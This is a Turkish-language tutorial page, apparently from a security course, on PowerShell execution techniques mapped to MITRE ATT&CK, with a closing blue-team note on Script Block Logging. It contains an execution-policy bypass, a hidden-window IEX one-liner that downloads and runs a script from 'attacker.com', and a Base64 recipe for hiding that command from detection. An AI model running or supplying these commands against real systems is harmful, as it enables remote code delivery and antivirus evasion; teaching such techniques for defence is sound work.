# 5.2. Erişim ve Kod Yürütme (Execution)

[↩️ Geri: İçindekiler](../../README.md)

Keşif aşaması tamamlandıktan sonra saldırgan, diğer sistemlere erişmek ve istediği kodu çalıştırmak için PowerShell'in esnekliğinden faydalanır. Bu aşamanın ana hedefi, kısıtlamaları atlatarak komutları gizlice yürütmektir.

### Execution Policy Bypass (T1059.001: PowerShell)

Birçok sistemde varsayılan olarak `Restricted` olan yürütme politikasını atlatmak, bir saldırganın ilk adımıdır.
```powershell
# En yaygın bypass yöntemi
powershell.exe -ExecutionPolicy Bypass -File C:\Temp\payload.ps1
```
Bu, sadece o anki `powershell.exe` süreci için politikayı geçersiz kılar, kalıcı bir değişiklik yapmaz ve daha az iz bırakır.

### Dosyasız (Fileless) Kod Yürütme

Antivirüsler genellikle diske yazılan dosyaları tarar. Bu tespitten kaçınmak için saldırganlar, kodu doğrudan bellekte indirip çalıştırır.
```powershell
# Klasik IEX (Invoke-Expression) yöntemi
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```
-   `-nop` (NoProfile): PowerShell profillerini yüklemez, tespit riskini azaltır.
-   `-w hidden` (WindowStyle Hidden): PowerShell penceresini gizler.
-   `-c` (Command): Verilen komutu çalıştırır.

### Encoding ile Gizleme (T1027: Obfuscated Files or Information)

Basit metin tabanlı güvenlik ürünlerini (IDS/IPS) atlatmak için komutlar genellikle Base64 ile kodlanır.
```powershell
# Önce komutu Base64'e çevirelim
$command = "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Şimdi kodlanmış komutu çalıştıralım
powershell.exe -EncodedCommand $encodedCommand
```
Mavi Takım için **Script Block Logging (Olay ID 4104)** bu tür saldırıları tespit etmek için kritiktir, çünkü bu loglama mekanizması komutun kodlanmamış halini yakalar.

---
[➡️ Sonraki Konu: Kalıcılık ve Yetki Yükseltme](./03-Kalicilik-ve-Yetki-Yukseltme.md)
